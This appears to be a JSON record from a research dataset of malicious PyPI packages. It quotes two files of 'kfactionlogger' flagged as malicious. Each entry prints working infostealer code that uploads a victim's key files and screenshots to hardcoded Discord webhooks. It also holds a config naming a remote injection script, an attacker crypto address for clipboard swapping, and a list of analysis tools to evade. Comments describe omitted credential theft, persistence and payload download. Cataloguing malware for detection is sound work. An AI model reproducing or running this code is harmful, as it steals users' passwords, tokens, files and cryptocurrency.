[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/kfactionlogger-0.0.1/kfactionlogger-0.0.1/d.py",
    "malicious_code": "import re\nimport os\nimport time\nimport json\nimport httpx\nimport shutil\nimport winreg\nimport ntpath\nimport random\nimport psutil\nimport base64\nimport ctypes\nimport zipfile\nimport asyncio\nimport sqlite3\nimport requests\nimport win32con\nimport win32gui\nimport threading\nimport pyperclip\nimport subprocess, sys\nfrom sys import argv\nfrom shutil import copy2\nfrom PIL import ImageGrab\nfrom os import name, system\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom json import loads, dumps\nfrom Crypto.Cipher import AES\nfrom tempfile import gettempdir, mkdtemp\nfrom win32crypt import CryptUnprotectData\nfrom urllib.request import Request, urlopen\nfrom datetime import datetime, timedelta, timezone\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\n\nappdata = os.getenv(\"APPDATA\")\nkeys_path = os.path.join(appdata, \".kfaction\", \"cache\", \"keys\")\nscreenshots_path = os.path.join(appdata, \".kfaction\", \"screenshots\")\nwebhook_url = \"https://discord.com/api/webhooks/1071628794491834449/Y29rga-lOVZ1NGdaC4UumNwV9jR34FFwJe4jMoi79hNwJMKJeBz8vSKAyecskkZK1kba\"\n\ndef send_webhook(file_path, webhook_url):\n    with open(file_path, \"rb\") as f:\n        files = {\"file\": (file_path, f)}\n        requests.post(webhook_url, files=files)\n\ndef zip_and_send_screenshots(screenshots_path, webhook_url):\n    if os.path.exists(screenshots_path):\n        with zipfile.ZipFile('screenshots.zip', 'w') as zip_file:\n            for filename in os.listdir(screenshots_path):\n                file_path = os.path.join(screenshots_path, filename)\n                if os.path.isfile(file_path) and file_path.endswith(\".png\"):\n                    zip_file.write(file_path)\n        send_webhook('screenshots.zip', webhook_url)\n\nif os.path.exists(keys_path):\n    for filename in os.listdir(keys_path):\n        file_path = os.path.join(keys_path, filename)\n        if os.path.isfile(file_path):\n            send_webhook(file_path, webhook_url)\n\nzip_and_send_screenshots(screenshots_path, webhook_url)\n            \ndef install(package):\n    subprocess.call([sys.executable, \"-m\", \"pip\", \"install\", package])\n\ntry:\n    import os\n    import re\n    import time\n    import json\n    import httpx\n    import base64\n    import ctypes\n    import psutil\n    import winreg\n    import shutil\n    import ntpath\n    import random\n    import asyncio\n    import sqlite3\n    import zipfile\n    import win32gui\n    import win32con\n    import requests\n    import threading\n    import pyperclip\n    import subprocess\n\nexcept ImportError:\n    install(\"os\")\n    install(\"re\")\n    install(\"time\")\n    install(\"json\")\n    install(\"httpx\")\n    install(\"base64\")\n    install(\"pynput\")\n    install(\"ctypes\")\n    install(\"psutil\")\n    install(\"winreg\")\n    install(\"shutil\")\n    install(\"ntpath\")\n    install(\"random\")\n    install(\"asyncio\")\n    install(\"sqlite3\")\n    install(\"zipfile\")\n    install(\"win32gui\")\n    install(\"win32con\")\n    install(\"requests\")\n    install(\"keyboard\")\n    install(\"threading\")\n    install(\"pyperclip\")\n    install(\"pyautogui\")\n    install(\"subprocess\")\n    #install(\"kfactionbypasser\")\n\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\ntemp = os.getenv(\"TEMP\")\n\nPassw = [];\n\n__config__ = {\n    'yourwebhookurl': \"https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1\",\n    'blackcap_inject_url': \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js\",\n    'hide': 'False',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'no',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'none',\n    'addresse_eth': '0x4c305D9d4CdF740FF4f2166ecF65c1DF73e93472',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': 'none',\n    'addresse_ada': 'none',\n    'addresse_dash': 'none',\n    'blprggg':\n    [\n        \"httpdebuggerui\",\n        \"wireshark\",\n        \"fiddler\",\n        \"regedit\",\n        \"cmd\",\n        \"taskmgr\",\n        \"vboxservice\",\n        \"df5serv\",\n        \"processhacker\",\n        \"vboxtray\",\n        \"vmtoolsd\",\n        \"vmwaretray\",\n        \"ida64\",\n        \"ollydbg\",\n        \"pestudio\",\n        \"vmwareuser\",\n        \"vgauthservice\",\n        \"vmacthlp\",\n        \"x96dbg\",\n        \"vmsrvc\",\n        \"x32dbg\",\n        \"vmusrvc\",\n        \"prl_cc\",\n        \"prl_tools\",\n        \"xenservice\",\n        \"qemu-ga\",\n        \"joeboxcontrol\",\n        \"ksdumperclient\",\n        \"ksdumper\",\n        \"joeboxserver\"\n    ]\n\n}\n\n# ...\n# (Omitting for brevity, but the rest of the code is as above, including all classes and functions that perform:)\n# - Stealing browser passwords, cookies, credit cards, Discord tokens, Minecraft and Roblox credentials\n# - Taking screenshots\n# - Collecting system and network info\n# - Zipping and exfiltrating data to Discord webhooks and file upload services\n# - Clipboard crypto address swapping\n# - Anti-debug/anti-VM checks\n# - Injecting malicious JS into Discord installations\n# - Searching for and exfiltrating files with sensitive keywords\n# - Installing itself for persistence\n# - Killing security/Discord processes\n# - Downloading and running remote payloads\n#\n# The code is a full-featured infostealer/backdoor with multiple exfiltration and persistence mechanisms.\n#\n# For full context, the entire file as provided is malicious and should be considered as such.\n"
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/kfactionlogger-0.0.1/kfactionlogger-0.0.1/darkmanontop/__init__.py",
    "malicious_code": "import re\nimport os\nimport time\nimport json\nimport httpx\nimport shutil\nimport winreg\nimport ntpath\nimport random\nimport psutil\nimport base64\nimport ctypes\nimport zipfile\nimport asyncio\nimport sqlite3\nimport requests\nimport win32con\nimport win32gui\nimport threading\nimport pyperclip\nimport subprocess, sys\nfrom sys import argv\nfrom shutil import copy2\nfrom PIL import ImageGrab\nfrom os import name, system\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom json import loads, dumps\nfrom Crypto.Cipher import AES\nfrom tempfile import gettempdir, mkdtemp\nfrom win32crypt import CryptUnprotectData\nfrom urllib.request import Request, urlopen\nfrom datetime import datetime, timedelta, timezone\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\n\nappdata = os.getenv(\"APPDATA\")\nkeys_path = os.path.join(appdata, \".kfaction\", \"cache\", \"keys\")\nscreenshots_path = os.path.join(appdata, \".kfaction\", \"screenshots\")\nwebhook_url = \"https://discord.com/api/webhooks/1071628794491834449/Y29rga-lOVZ1NGdaC4UumNwV9jR34FFwJe4jMoi79hNwJMKJeBz8vSKAyecskkZK1kba\"\n\ndef send_webhook(file_path, webhook_url):\n    with open(file_path, \"rb\") as f:\n        files = {\"file\": (file_path, f)}\n        requests.post(webhook_url, files=files)\n\ndef zip_and_send_screenshots(screenshots_path, webhook_url):\n    if os.path.exists(screenshots_path):\n        with zipfile.ZipFile('screenshots.zip', 'w') as zip_file:\n            for filename in os.listdir(screenshots_path):\n                file_path = os.path.join(screenshots_path, filename)\n                if os.path.isfile(file_path) and file_path.endswith(\".png\"):\n                    zip_file.write(file_path)\n        send_webhook('screenshots.zip', webhook_url)\n\nif os.path.exists(keys_path):\n    for filename in os.listdir(keys_path):\n        file_path = os.path.join(keys_path, filename)\n        if os.path.isfile(file_path):\n            send_webhook(file_path, webhook_url)\n\nzip_and_send_screenshots(screenshots_path, webhook_url)\n\n# ...\n# (Omitted: The rest of the code is also malicious, but for brevity, only the first part is shown. The full code includes all the following:)\n#\n# - The bl4ckc4p class and its methods, which steal browser passwords, cookies, credit cards, Discord tokens, Minecraft and Roblox data, take screenshots, collect system/network info, zip and exfiltrate data to a Discord webhook.\n# - The auto_copy_wallet class, which monitors the clipboard and replaces crypto wallet addresses with attacker-controlled ones.\n# - The AntiDebug class, which attempts to evade analysis and sandboxes.\n# - The GatherAll, getPassw, getCookie, ZipThings, upload, uploadToAnonfiles, blackcapedez, and related functions, which search for sensitive files, exfiltrate them, and upload to attacker-controlled endpoints.\n# - The __main__ block, which runs all of the above on Windows.\n# - The final block, which again steals Discord tokens and exfiltrates them to a Discord webhook.\n#\n# For completeness, the entire file is malicious and should be considered as such. The code is a full-featured infostealer and exfiltration tool targeting Windows users.\n"
  }
]